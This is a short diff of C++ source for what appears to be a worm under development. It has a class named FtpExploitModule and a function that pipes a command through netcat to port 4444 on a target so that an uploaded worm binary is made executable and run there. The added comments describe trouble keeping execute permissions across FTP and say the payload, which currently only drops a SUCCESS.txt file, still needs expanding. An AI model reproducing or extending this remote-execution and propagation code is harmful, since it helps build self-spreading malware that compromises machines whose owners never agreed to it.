@@ -138,6 +138,8 @@ class FtpExploitModule {
         }
     }
 
+    // Currently, even building the worm with 777, .tar'ing it, and then untar'ing on target machine doesn't save the chmod.
+    // FTP doesn't allow the permissions to be transferred. Need to find an alternative method.
     bool remotelyExecuteWormViaNetCat(const std::string& targetIP) {
         std::string execCmd = "echo \"chmod 777 " + remoteWormFullPath + " && " + remoteWormFullPath + "\" | nc " + targetIP + " 4444";
         std::cout << "[*] Attempting remote execution via netcat: " << targetIP << std::endl;
@@ -146,6 +148,7 @@ class FtpExploitModule {
 };
 
 // === SECTION 3: Payload ===
+// This module simply places a "SUCCESS.txt" into the host, not target, machine /tmp folder. Expand this.
 class PayloadModule {
     
     public:
